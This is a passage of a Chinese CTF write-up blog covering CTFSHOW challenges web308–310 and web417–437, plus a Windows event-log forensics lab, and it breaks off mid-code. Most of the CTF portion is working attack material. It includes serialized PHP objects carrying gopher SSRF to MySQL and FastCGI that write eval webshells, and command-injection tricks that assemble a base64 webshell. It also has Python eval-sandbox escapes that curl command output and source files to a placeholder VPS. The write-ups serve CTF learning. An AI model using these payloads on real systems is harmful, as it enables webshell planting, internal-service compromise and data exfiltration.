1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjE7IGVjaG8gIjw/cGhwIGV2YWwoXCRfUE9TVFsxXSk7Pz4iID4gMS5waHA7Ijt9fQ== 把结果写入Cookie即可，路径是/controller/logout.php，参数是service 然后蚁剑连接webshell，flag在/var/www/html目录 web308下载附件分析代码，发现dao.php的clearCache()函数加了过滤，只能匹配纯英文字符，因此上题的方法在这里行不通 继续分析代码，发现index.php有反序列化代码，且调用了一个函数checkVersion() 查找checkVersion()函数的定义，在dao.php里面 继续分析update_url，在config.php里面可以看到$update_url的定义，是个地址链接 接着再分析checkUpdate()函数的定义 checkUpdate()函数通过cURL发起HTTP请求，因此突破口就是这里，我们可以通过这个打SSRF漏洞 利用链： 1[index.php] unserialize -&gt; [/controller/service/dao/dao.php] dao::checkVersion() 看了一下，发现config.php里面并没有设置mysql密码 因此我们用Gopher协议打无密码的mysql，工具是Gopherus，下载地址：https://github.com/tarunkant/Gopherus 1python2 gopherus.py --exploit mysql 输入以下内容 数据库用户名：root 待执行命令：select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;; 得到结果： 1gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01 如果是直接传参就需要进行URL编码，但是这里是反序列化，解析payload时已经在服务端，因此不需要二次编码 payload： 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01;';}$a= new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjQ6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDE7Ijt9fQ== 把结果写入Cookie即可，路径是/index.php，参数是service 最后蚁剑连接webshell即可 web309题目提示mysql有密码了，因此上题打无密码msql的方法在这里用不了 附件还是和上题一样，这次可以用Gopher扫描端口试试 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:端口';}$a= new dao();echo base64_encode(serialize($a)); 常见危险端口： 12345678921 FTP22 SSH80 HTTP443 HTTPS3389 RDP1433 MS-SQL Server3306 MySQL6379 Redis9000 PHP-FPM / FastCGI 用Gopher请求端口时，如果端口有服务在监听，则会接受连接并等待我们传输数据，此时连接会“卡住”一段时间；如果端口没有服务，则会立刻拒绝连接。通过是否出现等待，就能判断端口是否开放 方法跟之前一样，也是把结果写入Cookie，路径是/index.php，参数是service 扫描到9000的时候未响应，说明9000端口开放 可以用Gopher协议打FastCGI，工具也是Gopherus 1python2 gopherus.py --exploit fastcgi 输入以下内容 已知文件绝对路径：/var/www/html/index.php 待执行命令：echo &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; 1.php 得到结果： 1gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 payload： 123456789101112&lt;?phpclass dao{ private $config; public function __construct(){ $this-&gt;config=new config(); }}class config{ public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH92%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5C%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';}$a= new dao();echo base64_encode(serialize($a)); 运行结果： 1TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo2NDk6ImdvcGhlcjovLzEyNy4wLjAuMTo5MDAwL18lMDElMDElMDAlMDElMDAlMDglMDAlMDAlMDAlMDElMDAlMDAlMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDElMDQlMDQlMDAlMEYlMTBTRVJWRVJfU09GVFdBUkVnbyUyMC8lMjBmY2dpY2xpZW50JTIwJTBCJTA5UkVNT1RFX0FERFIxMjcuMC4wLjElMEYlMDhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMSUwRSUwMkNPTlRFTlRfTEVOR1RIOTIlMEUlMDRSRVFVRVNUX01FVEhPRFBPU1QlMDlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUlMjAlM0QlMjBPbiUwQWRpc2FibGVfZnVuY3Rpb25zJTIwJTNEJTIwJTBBYXV0b19wcmVwZW5kX2ZpbGUlMjAlM0QlMjBwaHAlM0EvL2lucHV0JTBGJTE3U0NSSVBUX0ZJTEVOQU1FL3Zhci93d3cvaHRtbC9pbmRleC5waHAlMEQlMDFET0NVTUVOVF9ST09ULyUwMCUwMCUwMCUwMCUwMSUwNCUwMCUwMSUwMCUwMCUwMCUwMCUwMSUwNSUwMCUwMSUwMCU1QyUwNCUwMCUzQyUzRnBocCUyMHN5c3RlbSUyOCUyN2VjaG8lMjAlMjIlM0MlM0ZwaHAlMjBldmFsJTI4JTVDJTI0X1BPU1QlNUIxJTVEJTI5JTNCJTNGJTNFJTIyJTIwJTNFJTIwMS5waHAlMjclMjklM0JkaWUlMjglMjctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0lMEElMjclMjklM0IlM0YlM0UlMDAlMDAlMDAlMDAiO319 把结果写入Cookie即可，路径是/index.php，参数是service 然后蚁剑连接即可 web310附件还是跟web308一样 方法和上题相同，也是用Gopher协议打FastCGI 把结果写入Cookie，路径是/index.php，参数是service 连接蚁剑webshell，但是这次flag不在/var/www/html 找了一下，发现flag在/var/flag目录 参考Jay 17：https://blog.csdn.net/Jayjay___/article/details/133146315","link":"/posts/ctfshow-code-audit-web301-web310/"},{"title":"玄机靶场 | 日志分析-windows日志分析base","text":"前言题目描述：客户反映自己的用户在4月6日中午12点左右被挤掉线了，请你上机排查安全事件 RDP连接，端口3389，用户名：Administrator，密码：4210bf? 索引 题目列表步骤#1客户机的系统安全日志文件所在的绝对路径是？ win+r输入eventvwr.msc，打开事件查看器 然后点击windows日志，右键点击安全，打开属性 可以看到一个日志路径，这就是系统安全日志文件所在路径 1%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 但这是相对路径，我们复制Security.evtx前面的路径，然后在文件资源管理器打开 会跳转到目录C:\\Windows\\System32\\winevt\\Logs，这就是系统安全日志文件所在的绝对路径。该路径一般是固定的，建议记住该位置方便以后进行查找 1flag{C:\\Windows\\System32\\winevt\\Logs} 步骤#2恶意用户是利用什么协议发起的登录？ 题目提示客户反映自己的用户在4月6日中午12点左右被挤掉线了 先介绍一下常见的事件ID类型 12345678910111213144624 登录成功4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息4726 删除用户4722 账号启用4725 账号禁用4723 修改密码4724 重置密码4634 注销成功4647 用户启动的注销4672 管理员登录4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录4732 加入安全组，常见于将新用户加入管理员组4733 移除出安全组4684 通过登陆界面登陆的 我们返回事件查看器，设置筛选条件为4月6日早上9点到下午15点，由于是要查看攻击者是如何登陆的，所以事件ID我们选择4624和4625 然后按照时间顺序逐个分析，我们主要关注登录的账号名、登录类型、登录是否成功以及登录源IP 其中登录类型是以数字的形式列举出来的，所以我们需要对照以下表格分析 登录类型 说明 典型协议/场景 2 交互式登录（本地键盘或控制台） 本地 3 网络登录（访问共享、SMB等） SMB、HTTP（除明文） 4 批处理（计划任务） 本地/系统 5 服务账号 本地/系统 7 解锁（屏幕锁解锁） 本地 8 网络明文（如HTTP Basic认证） 明文HTTP、Advapi 9 新凭证（RunAs带netonly参数等） 本地与网络混合 10 远程交互登录（RDP等） RDP（远程桌面协议） 11 缓存交互（离线域登录） 本地缓存 分析到2025/4/6 11:33:34的日志时发现异常，出现了一个未知的IP，且登录失败，然后协议类型为10，也就是利用rdp登录 继续向下分析，发现该IP尝试了多个用户名进行rdp远程登录 根据收集的结果，总共尝试了admin、XJ、XuanJi、XiaoMa和Administrator这几个用户名，其中前四个都登录失败，最后一个Administrator登录成功，可以看出该IP在进行用户名爆破，因此推断这就是攻击者 所以恶意用户是利用rdp协议发起的登录 1flag{rdp} 步骤#3攻击者总共使用了几个账户名尝试登录？ 根据上一题的分析，可知攻击者使用了五个账号名尝试登录，分别为 1admin、XJ、XuanJi、XiaoMa、Administrator 因此答案就是5 1flag{5} 步骤#4攻击者总共在客户机上尝试创建了几个不同名用户？ 根据步骤二的常见事件ID类型，我们修改筛选条件为4720 可以看到总共有五个日志，我们逐个分析 发现有两个账号名均为hack，然后还有三个分别是hacker、hacker_real$、system13$，因此攻击者总共在客户机上尝试创建了4个不同名的用户 1flag{4}","link":"/posts/Xuanji-CTF-Windows-Security-Log-Analysis/"},{"title":"CTFSHOW | 其他篇题解（二）web417 - web437","text":"前言由于题目比较多，所以分三个部分来写，这是第二部分 题目列表web417有个3.php文件，下载后是一段加密代码，用ai解密 得到代码 12345678include('flag.php');$c=$_GET['ctf'];if($c=='show'){ echo $flag;}else{ echo 'FLAG_NOT_HERE';}?&gt; GET传入 1?ctf=show 成功得到flag web418先看代码 由于变量key已经被赋值为0，因此这个后门没什么用，需要另辟蹊径 然后我们可以看到有个extract函数，这是PHP里的一个函数调用。extract()作用是把数组里的键名当作变量名，在当前作用域创建同名变量，并赋值为数组的对应值。比如$_POST['wayne']=123时，extract($_POST);之后就有了变量$wayne=123 我们看这个代码 1$die?die('FLAG_NOT_HERE'):clear($clear); 由于变量die没有被赋值，因此可以进行变量覆盖。这是三目运算符，我们可以传入0来触发后面的clear($clear) 继续往下划，可以看到clear函数的定义 给变量clear用分号截断命令即可，POST传入 1die=0&amp;clear=;echo '&lt;?=eval($_POST[1]);?&gt;'&gt;/var/www/html/1.php 然后蚁剑连接 在网页根目录找到flag web419先看代码 这题要求POST传入参数code，且长度要小于17，然后eval执行php代码 咱们用反引号执行命令即可，把当前目录下的flag.php复制到1.txt payload： 1code=`cp f* 1.txt`; 然后打开1.txt读取flag即可 web420先看代码 这次code长度被限制在8位以内，也就是7位，然后eval函数也换成了system。有几个方法可以做这题 方法一：nl输出 nl命令是Linux系统中的一个命令行工具，全称是“number lines”，用于给文本文件或标准输入的每一行添加行号，并将结果输出。它类似于cat -n，但nl对行号显示格式和处理方式更灵活 经过尝试，发现flag在/var/www目录里面 payload： 1code=nl ../* 方法二：写文件并执行 非常妙的一个方法，强烈建议学习，参考文章：命令注入长度限制绕过 假设我们要写入webshell 目标是传入echo PD89ZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php; 先用重定向符创建文件，依次执行以下命令 12345678910111213141516171819&gt;hp\\;&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\-\\\\&gt;4\\ \\\\&gt;e6\\\\&gt;bas\\\\&gt;=\\|\\\\&gt;w=\\\\&gt;0pO\\\\&gt;bMV\\\\&gt;U1R\\\\&gt;1BP\\\\&gt;gkX\\\\&gt;hbC\\\\&gt;ZXZ\\\\&gt;PD89\\\\&gt;o\\ \\\\&gt;ech\\\\ 然后把这些文件名以时间倒序形式写入任意一个文件，例如0 1ls -t&gt;0 最后运行文件即可，会执行0里面的命令，然后在当前目录创建一个1.php 1sh 0 连接蚁剑即可 成功找到flag web421先看代码 这次是要求code长度小于6，也就是长度为5 经过测试，发现flag就在当前目录。直接nl读取就可以 payload： 1code=nl f* 然后打开源代码查看flag web422先看代码 相比上题，这题的code长度被限制在5以内 直接nl打印全部内容即可 payload： 1code=nl * 然后查看网页源码 web423打开源代码，可以看到提示 拼接code参数，一开始用PHP和直接执行命令都不行。经过测试，这个网站是python文件运行的，要用python代码执行 payload： 1?code=os.popen('ls').read() 可以把原始代码打印出来看看 1?code=os.popen('cat app.py').read() 1234567891011121314from flask import Flask from flask import request import os app = Flask(__name__) @app.route('/') def app_index(): code = request.args.get('code') if code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;' if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 执行命令获取flag即可 1?code=os.popen('cat /flag').read() web424这题用?code=os.popen('ls').read()会报内部错误，既然执行命令不可以，我们试试直接用open函数读取文件 1?code=open('app.py').read() 成功执行，得到网页源码 1234567891011121314from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到，这次没有了os模块，没办法执行系统命令了，不过不影响我们读取文件 payload： 1?code=open('/flag').read() 成功得到flag web425跟上题一样，先读取源代码看看 1?code=open('app.py').read() 123456789101112131415from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: if 'os' not in code: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题相比上题，过滤了code里面的os字符串，其他都是一样的，不影响我们做题 payload： 1?code=open('/flag').read() web426上题的payload也能用，先看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题的正则匹配改了，简单解释一下 re.compile(r'os|popen') 创建了一个模式，表示“匹配 os 或 popen” 竖线 | 是“或”的意思 reg.match(code) 表示只从字符串开头匹配： 如果字符串开头含 os 或 popen，匹配成功 否则匹配失败（即 None） 也就是开头不能包含os和popen，不过对我们影响不大 payload： 1?code=open('/flag').read() web427可以继续用上题的payload，先看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen|system') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比上题多过滤了system，不影响做题 payload： 1?code=open('/flag').read() web428可以继续用上题的payload看源码 1?code=open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|popen|system|read') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题比上题多过滤了read，不过因为reg.match(code)匹配的是开头，所以对我们没有影响 payload： 1?code=open('/flag').read() web429这题一开始用open('app.py').read()执行不了，猜测是某个地方被过滤了，经过尝试，在前面加个空格即可绕过限制 1?code= open('app.py').read() 源代码： 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到，这题过滤了open字符串，因为re.match() 是从字符串开头匹配，所以我们在前面加个空格即可绕过 payload： 1?code= open('/flag').read() web430可以用上题的payload，先看源代码 1?code= open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这题把eval也过滤了，不过对我们没影响 payload： 1?code= open('/flag').read() web431继续用上题的方法做就好，看看源码 1?code= open('app.py').read() 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval|str') if reg.match(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 这次多过滤了str，不影响做题 payload： 1?code= open('/flag').read() web432这题用不了之前的方法了，看了网上其他师傅的做法，可以用类似SSTI模板注入的方法来做，构造一条命令执行的链子 由于os.system()不会把命令的输出结果返回给 Python 程序，所以我们用curl外带数据显示 payload： 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 简单解释里面的一些代码 1__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm') __builtins__：是 Python 的一个内置模块，包含了所有内建函数和对象（如 print, str, dict 等）。它在任何 Python 代码中都可以直接访问 __dict__：这是 Python 对象的一个特殊属性，它是一个字典（dict），存储了该对象（这里是 __builtins__ 模块）的所有属性。键是属性名，值是属性本身 __builtins__.__dict__['__import__']：这部分代码通过字典键值查询的方式，从 __builtins__ 模块中获取了内建函数 __import__。这和直接写 __import__ 是一样的，但更隐蔽 __getattribute__：是 Python 对象的一个方法，用于获取对象的属性。os.__getattribute__('system') 的效果和 os.system 完全一样 %2b表示+号，目的是为了绕过正则匹配限制 我们可以通过curl把app.py内容转为base64编码外带到vps显示 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`base64 -w 0 app.py`')) 默认情况下，base64 命令输出的编码字符串会在每 76 个字符后自动换行，所以我们不用cat app.py|base64，会显示不完整，我们用base64 -w 0 app.py即可，参数 -w 0表示取消换行 解码base64，成功得到网站源码 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到之前的reg.match(code)改成了reg.search(code)，意味着从检测开头变换到检测整个字符串 最后找flag就可以 payload： 1?code=str(__builtins__.__dict__['__impo'%2b'rt__']('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`cat /flag`')) 得到的flag没有括号，自行加个括号就可以 web433直接用上题的payload会不行，经过测试发现去掉builtins就可以了 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 也可以把so反转成os，[::-1] 是 Python 中字符串切片的写法，表示反转字符串。'so'[::-1]结果是 os 1?code=str(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`ls`')) 老样子，我们看看源码，方法跟上题一样，base64带出来 12345678910111213141516from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route('/')def app_index(): code = request.args.get('code') if code: reg = re.compile(r'os|open|system|read|eval|builtins') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题把builtins模块禁了，我们直接import就可以 payload： 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('curl http://你的vps地址:端口?p=`cat /flag`')) web434经过测试，发现这题是把curl过滤了，加个'%2b'在中间就可以 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('cu'%2b'rl http://你的vps地址:端口?p=`ls`')) 我们看看源码 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code) def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 发现多了两个函数，用于将字符串中的全角字符转换为半角字符，然后后面调用 stringQ2B 将 code 中的全角字符全部转为半角，返回结果重新赋值给 code，对我们影响不大 payload： 1?code=str(__import__('o'%2b's').__getattribute__('syste'%2b'm')('cu'%2b'rl http://你的vps地址:端口?p=`cat /flag`')) web435测试发现是把下划线禁了，我们可以用web433提到的字符串切片方法来反转字符串 首先构建反转代码，我们可以直接引入os，然后调用里面的system函数，原始代码：import os; os.system(&quot;curl http://你的vps地址:端口?p=ls&quot;) 1?code=str(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1]) 可以在网页看到原始代码 我们具体解释一下[::-1]代码，Python 的切片语法是： 1sequence[start:stop:step] start 是切片起始索引（包含该位置） stop 是结束索引（不包含该位置） step 是步长（跨越的索引间隔） 其中三个参数都可以省略 [::-1] 的含义： start 和 stop 都省略，表示从序列的头到尾 step 是 -1 ，表示步长为-1，即反向遍历序列 这样会创建序列的反转副本，不改变原序列 然后我们用exec执行这串代码就可以 payload： 1?code=str(exec(')&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 可以把它的源码爆出来看看 1?code=str(exec(')&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code)def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl|_') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 最后我们找flag就可以 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web436可以继续用上题的方法 我们把源码爆出来看看 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): &quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot; inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: #转完之后不是半角字符返回原来的字符 return uchar return chr(inside_code)def stringQ2B(ustring): &quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot; return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])@app.route('/')def app_index(): code = request.args.get('code') if code: code = stringQ2B(code) reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr') if reg.search(code)==None: return eval(code) return 'where is flag?&lt;!-- /?code --&gt;'if __name__==&quot;__main__&quot;: app.run(host='0.0.0.0',port=80) 可以看到这题把getattr过滤了，不过不影响我们做题，步骤跟上题一样 payload： 1?code=str(exec(')&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi'[::-1])) web437跟上题一样的方法 爆出源码看看 12345678910111213141516171819202122232425262728293031323334from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)def Q2B(uchar): inside_code = ord(uchar) if inside_code == 0x3000: inside_code = 0x0020 else: inside_code -= 0xfee0 if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: return uchar return chr(inside_code)def stringQ2B(ustring): return 